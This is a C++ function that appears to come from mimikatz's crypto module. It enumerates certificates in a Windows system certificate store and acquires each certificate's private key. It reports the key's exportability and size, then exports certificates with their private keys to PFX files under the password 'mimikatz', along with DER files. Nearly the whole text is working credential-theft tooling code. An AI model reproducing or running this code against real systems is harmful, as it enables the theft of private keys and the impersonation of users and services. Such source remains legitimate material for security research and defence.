void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * arguments, bool exportCert)
{
	wstring monEmplacement = L"CERT_SYSTEM_STORE_CURRENT_USER";
	wstring monStore = L"My";

	if(arguments->size() == 1)
	{
		monEmplacement = arguments->front();
	}
	else if(arguments->size() == 2)
	{
		monEmplacement = arguments->front();
		monStore = arguments->back();
	}
	
	(*outputStream) << L"Emplacement : \'" << monEmplacement << L'\'';

	DWORD systemStore;
	if(mod_crypto::getSystemStoreFromString(monEmplacement, &systemStore))
	{
		(*outputStream) << L"\\" << monStore << endl;
		if(HCERTSTORE hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, NULL, NULL, systemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, monStore.c_str()))
		{
			DWORD i;
			PCCERT_CONTEXT pCertContext;
			for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++)
			{
				wstring * certName = new wstring();
				bool reussite = false;

				if(!mod_crypto::getCertNameFromCertCTX(pCertContext, certName))
					certName->assign(L"[empty]");

				(*outputStream) << L"\t - " << *certName << endl;;
				sanitizeFileName(certName);

				wstringstream monBuff;
				monBuff << monEmplacement << L'_' << monStore << L'_' << i << L'_' << *certName << L'.';
										
				mod_crypto::KIWI_KEY_PROV_INFO keyProvInfo;
				if(mod_crypto::getKiwiKeyProvInfo(pCertContext, &keyProvInfo))
				{
					(*outputStream) << L"\t\tContainer Clé : " << keyProvInfo.pwszContainerName << endl;
					(*outputStream) << L"\t\tProvider      : " << keyProvInfo.pwszProvName << endl;
						
					HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv = NULL;
					DWORD keySpec = 0;
					BOOL aFermer = false;
						
					if(CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG /* CRYPT_ACQUIRE_SILENT_FLAG NULL */, NULL, &monProv, &keySpec, &aFermer))
					{
						(*outputStream) << L"\t\tType          : " << mod_crypto::KeyTypeToString(keySpec) << endl;
							
						DWORD size = 0;
						bool exportable = false;

						if(keySpec == CERT_NCRYPT_KEY_SPEC)
						{
							if(mod_cryptong::isNcrypt)
							{
								reussite = mod_cryptong::getKeySize(&monProv, &size);
								reussite &=mod_cryptong::isKeyExportable(&monProv, &exportable);

								if(aFermer)
								{
									mod_cryptong::NCryptFreeObject(monProv);
								}
							}
							else (*outputStream) << L"\t\t\tErreur : Clé de type nCrypt, sans nCrypt ?" << endl;
						}
						else
						{
							DWORD tailleEcrite = 0;
							DWORD exportability;

							HCRYPTKEY maCle = NULL;
							if(reussite = (CryptGetUserKey(monProv, keySpec, &maCle) != 0))
							{
								tailleEcrite = sizeof(DWORD);
								reussite = (CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&size), &tailleEcrite, NULL) != 0);
								tailleEcrite = sizeof(DWORD);
								reussite &= (CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&exportability), &tailleEcrite, NULL) != 0);
								exportable = (exportability & CRYPT_EXPORT) != 0;
							}

							if(aFermer)
							{
								CryptReleaseContext(monProv, 0);
							}
						}
						if(reussite)
						{
							(*outputStream) << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
							(*outputStream) << L"\t\tTaille clé    : " << size << endl;
						}

						if(exportCert)
						{
							wstring PFXFile = monBuff.str();
							PFXFile.append(L"pfx");

							reussite = mod_crypto::CertCTXtoPFX(pCertContext, PFXFile, L"mimikatz");

							(*outputStream) << L"\t\tExport privé dans  \'" << PFXFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
							if(!reussite)
							{
								(*outputStream) << L"\t\t\t" << mod_system::getWinError() << endl;
							}
						}
					}
					else (*outputStream) << L"CryptAcquireCertificatePrivateKey : " << mod_system::getWinError() << endl;
				}

				if(exportCert)
				{
					wstring DERFile = monBuff.str();
					DERFile.append(L"der");
						
					reussite = mod_crypto::CertCTXtoDER(pCertContext, DERFile);
						
					(*outputStream) << L"\t\tExport public dans \'" << DERFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
					if(!reussite)
					{
						(*outputStream) << L"\t\t\t" << mod_system::getWinError() << endl;
					}
				}
				delete certName;
			}
			CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
		}
		else (*outputStream) << L"CertOpenStore : " << mod_system::getWinError() << endl;
	}
	else (*outputStream) << L" introuvable !" << endl;
}